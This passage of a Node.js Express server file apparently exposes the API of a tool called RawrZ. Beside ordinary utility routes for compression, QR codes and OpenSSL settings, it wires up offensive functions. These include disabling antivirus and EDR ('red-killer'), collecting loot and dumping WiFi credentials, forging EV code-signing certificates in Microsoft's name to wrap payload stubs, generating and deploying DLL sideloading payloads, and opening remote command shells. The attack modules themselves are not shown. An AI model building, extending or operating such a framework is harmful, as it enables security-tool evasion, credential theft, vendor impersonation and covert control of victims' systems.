app.post('/heap-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['heap',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Utilities endpoints
app.post('/random-math',requireAuth,async(req,res)=>{try{const{operation}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['randommath',operation||'add']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/data-conversion',requireAuth,async(req,res)=>{try{const{input,from,to}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['convert',input,from||'hex',to||'base64']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/compress',requireAuth,async(req,res)=>{try{const{input,algorithm='gzip'}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['compress',input,algorithm]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/decompress',requireAuth,async(req,res)=>{try{const{input,algorithm='gzip'}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['decompress',input,algorithm]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/qr-generate',requireAuth,async(req,res)=>{try{const{text,size=200}=req.body||{};if(!text)return res.status(400).json({error:'text is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['qr',text,size.toString()]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/barcode-generate',requireAuth,async(req,res)=>{try{const{text,type='code128'}=req.body||{};if(!text)return res.status(400).json({error:'text is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['barcode',text,type]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Network Tools additional endpoints
app.post('/network-scan',requireAuth,async(req,res)=>{try{const{network,subnet='24'}=req.body||{};if(!network)return res.status(400).json({error:'network is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['netscan',network,subnet]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/service-detection',requireAuth,async(req,res)=>{try{const{host,port}=req.body||{};if(!host)return res.status(400).json({error:'host is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['service',host,port||'80']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/vulnerability-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['vulnscan',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/packet-capture',requireAuth,async(req,res)=>{try{const{interface='eth0',count=10}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['packet',interface,count.toString()]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/traffic-analysis',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['traffic',file||'capture.pcap']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/protocol-analysis',requireAuth,async(req,res)=>{try{const{file}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['protocol',file||'capture.pcap']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Security & Threat Detection endpoints
app.post('/file-analysis',requireAuth,async(req,res)=>{try{const{filepath}=req.body||{};if(!filepath)return res.status(400).json({error:'filepath is required'});const rawrz=new RawrZStandalone();const result=await rawrz.analyzeFile(filepath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/file-hash',requireAuth,async(req,res)=>{try{const{filepath,algorithm='sha256'}=req.body||{};if(!filepath)return res.status(400).json({error:'filepath is required'});const rawrz=new RawrZStandalone();const result=await rawrz.hash(filepath,algorithm);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/security-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['security',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/threat-detection',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['threat',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/vulnerability-check',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['vulncheck',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/malware-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['malware',target]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// OpenSSL Management endpoints
app.get('/openssl/config',requireAuth,async(req,res)=>{try{const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=opensslModule.getConfigSummary();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/openssl/algorithms',requireAuth,async(req,res)=>{try{const{engine}=req.query;const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=opensslModule.getAvailableAlgorithms(engine);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/openssl/openssl-algorithms',requireAuth,async(req,res)=>{try{const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=opensslModule.getOpenSSLAlgorithms();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/openssl/custom-algorithms',requireAuth,async(req,res)=>{try{const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=opensslModule.getCustomAlgorithms();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/openssl/toggle-openssl',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};if(typeof enabled!=='boolean')return res.status(400).json({error:'enabled must be boolean'});const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=await opensslModule.toggleOpenSSLMode(enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/openssl/toggle-custom',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};if(typeof enabled!=='boolean')return res.status(400).json({error:'enabled must be boolean'});const opensslModule=await rawrzEngine.loadModule('openssl-management');const result=await opensslModule.toggleCustomAlgorithms(enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Comprehensive OpenSSL Management endpoints
app.get('/openssl-management/status',requireAuth,async(req,res)=>{try{const status=await rawrzEngine.getOpenSSLStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/openssl-management/toggle',requireAuth,async(req,res)=>{try{const{enabled}=req.body||{};if(typeof enabled!=='boolean')return res.status(400).json({error:'enabled must be boolean'});const result=await rawrzEngine.toggleOpenSSLMode(enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/openssl-management/test',requireAuth,async(req,res)=>{try{const{algorithm,data}=req.body||{};if(!algorithm)return res.status(400).json({error:'algorithm is required'});const result=await rawrzEngine.testOpenSSLAlgorithm(algorithm,data);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/openssl-management/preset',requireAuth,async(req,res)=>{try{const{preset}=req.body||{};if(!preset)return res.status(400).json({error:'preset is required'});const result=await rawrzEngine.applyOpenSSLPreset(preset);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/openssl-management/report',requireAuth,async(req,res)=>{try{const report=await rawrzEngine.generateOpenSSLReport();res.json({success:true,report})}catch(e){res.status(500).json({error:e.message})}});

// Implementation Checker endpoints
app.get('/implementation-check/status', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /implementation-check/status
        const result = await handleGETimplementationcheckstatus(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /implementation-check/status failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.post('/implementation-check/run', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /implementation-check/run
        const result = await handlePOSTimplementationcheckrun(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /implementation-check/run failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.get('/implementation-check/results',requireAuth,async(req,res)=>{try{const{checkId}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const results=implementationChecker.getCheckResults(checkId);res.json({success:true,results})}catch(e){res.status(500).json({error:e.message})}});
app.get('/implementation-check/modules',requireAuth,async(req,res)=>{try{const{moduleName}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const status=implementationChecker.getModuleStatus(moduleName);res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/implementation-check/force', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /implementation-check/force
        const result = await handlePOSTimplementationcheckforce(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /implementation-check/force failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health Monitor endpoints
app.get('/health-monitor/dashboard',requireAuth,async(req,res)=>{try{const dashboard=healthMonitor.getHealthDashboard();res.json({success:true,dashboard})}catch(e){res.status(500).json({error:e.message})}});
app.get('/health-monitor/status',requireAuth,async(req,res)=>{try{const{monitorId}=req.query;const status=healthMonitor.getMonitorStatus(monitorId);res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/health-monitor/toggle',requireAuth,async(req,res)=>{try{const{monitorId,enabled}=req.body||{};if(!monitorId||typeof enabled!=='boolean')return res.status(400).json({error:'monitorId and enabled are required'});const result=healthMonitor.toggleMonitor(monitorId,enabled);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/health-monitor/interval',requireAuth,async(req,res)=>{try{const{monitorId,interval}=req.body||{};if(!monitorId||!interval)return res.status(400).json({error:'monitorId and interval are required'});const result=healthMonitor.updateMonitorInterval(monitorId,interval);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Red Killer endpoints
app.get('/red-killer/status',requireAuth,async(req,res)=>{try{const status=await redKiller.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-killer/detect',requireAuth,async(req,res)=>{try{const detected=await redKiller.detectAVEDR();res.json({success:true,detected})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-killer/execute',requireAuth,async(req,res)=>{try{const{systems}=req.body||{};if(!systems)return res.status(400).json({error:'systems is required'});const result=await redKiller.executeRedKiller(systems);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-killer/extract',requireAuth,async(req,res)=>{try{const{targets}=req.body||{};const result=await redKiller.extractData(targets);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-killer/loot',requireAuth,async(req,res)=>{try{const loot=await redKiller.getLootContainer();res.json({success:true,loot})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-killer/loot/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const item=await redKiller.inspectLootItem(id);res.json({success:true,item})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-killer/wifi-dump',requireAuth,async(req,res)=>{try{const wifi=await redKiller.dumpWiFiCredentials();res.json({success:true,wifi})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-killer/kills',requireAuth,async(req,res)=>{try{const kills=await redKiller.getActiveKills();res.json({success:true,kills})}catch(e){res.status(500).json({error:e.message})}});

// EV Certificate Encryptor endpoints
app.get('/ev-cert/status',requireAuth,async(req,res)=>{try{const status=await evCertEncryptor.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/ev-cert/generate',requireAuth,async(req,res)=>{try{const{template='Microsoft Corporation',options={}}=req.body||{};const certId=await evCertEncryptor.generateEVCertificate(template,options);res.json({success:true,certId})}catch(e){res.status(500).json({error:e.message})}});
app.get('/ev-cert/certificates',requireAuth,async(req,res)=>{try{const certificates=await evCertEncryptor.getCertificates();res.json({success:true,certificates})}catch(e){res.status(500).json({error:e.message})}});
app.post('/ev-cert/encrypt-stub',requireAuth,async(req,res)=>{try{const{stubCode,language,certId,options={}}=req.body||{};if(!stubCode||!language||!certId)return res.status(400).json({error:'stubCode, language, and certId are required'});const result=await evCertEncryptor.encryptStubWithEVCert(stubCode,language,certId,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/ev-cert/stubs',requireAuth,async(req,res)=>{try{const stubs=await evCertEncryptor.getEncryptedStubs();res.json({success:true,stubs})}catch(e){res.status(500).json({error:e.message})}});
app.get('/ev-cert/templates',requireAuth,async(req,res)=>{try{const templates=await evCertEncryptor.getSupportedTemplates();res.json({success:true,templates})}catch(e){res.status(500).json({error:e.message})}});
app.get('/ev-cert/languages',requireAuth,async(req,res)=>{try{const languages=await evCertEncryptor.getSupportedLanguages();res.json({success:true,languages})}catch(e){res.status(500).json({error:e.message})}});
app.get('/ev-cert/algorithms',requireAuth,async(req,res)=>{try{const algorithms=await evCertEncryptor.getSupportedAlgorithms();res.json({success:true,algorithms})}catch(e){res.status(500).json({error:e.message})}});

// Beaconism DLL Sideloading endpoints
app.get('/beaconism/status',requireAuth,async(req,res)=>{try{const status=await beaconismDLL.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/beaconism/generate-payload',requireAuth,async(req,res)=>{try{const{target,payloadType,options={}}=req.body||{};if(!target||!payloadType)return res.status(400).json({error:'target and payloadType are required'});const result=await beaconismDLL.generatePayload(target,payloadType,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/beaconism/deploy',requireAuth,async(req,res)=>{try{const{payloadId,deploymentOptions={}}=req.body||{};if(!payloadId)return res.status(400).json({error:'payloadId is required'});const result=await beaconismDLL.deployPayload(payloadId,deploymentOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/beaconism/payloads',requireAuth,async(req,res)=>{try{const payloads=await beaconismDLL.getPayloads();res.json({success:true,payloads})}catch(e){res.status(500).json({error:e.message})}});
app.get('/beaconism/targets',requireAuth,async(req,res)=>{try{const targets=await beaconismDLL.getSideloadTargets();res.json({success:true,targets})}catch(e){res.status(500).json({error:e.message})}});
app.post('/beaconism/scan-target',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const result=await beaconismDLL.scanTarget(target);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Red Shells endpoints
app.get('/red-shells/status',requireAuth,async(req,res)=>{try{const status=await redShells.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-shells/create',requireAuth,async(req,res)=>{try{const{shellType='powershell',options={}}=req.body||{};const shell=await redShells.createRedShell(shellType,options);res.json({success:true,shell})}catch(e){res.status(500).json({error:e.message})}});
app.post('/red-shells/:id/execute',requireAuth,async(req,res)=>{try{const{id}=req.params;const{command}=req.body||{};if(!command)return res.status(400).json({error:'command is required'});const result=await redShells.executeCommand(id,command);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-shells',requireAuth,async(req,res)=>{try{const shells=await redShells.getActiveShells();res.json({success:true,shells})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-shells/:id/history',requireAuth,async(req,res)=>{try{const{id}=req.params;const history=await redShells.getShellHistory(id);res.json({success:true,history})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/red-shells/:id',requireAuth,async(req,res)=>{try{const{id}=req.params;const result=await redShells.terminateShell(id);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/red-shells/stats',requireAuth,async(req,res)=>{try{const stats=await redShells.getShellStats();res.json({success:true,stats})}catch(e){res.status(500).json({error:e.message})}});

// Advanced Features Panel
app.get('/advanced-features', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'advanced-features-panel.html'));
});

// Export the app and server for external use
module.exports = {
  app,
  port,
  authToken,
  rawrz,
  evCertEncryptor
};

// Start the server if this file is run directly
if (require.main === module) {
  app.listen(port,()=>console.log('[OK] RawrZ API listening on port',port));
}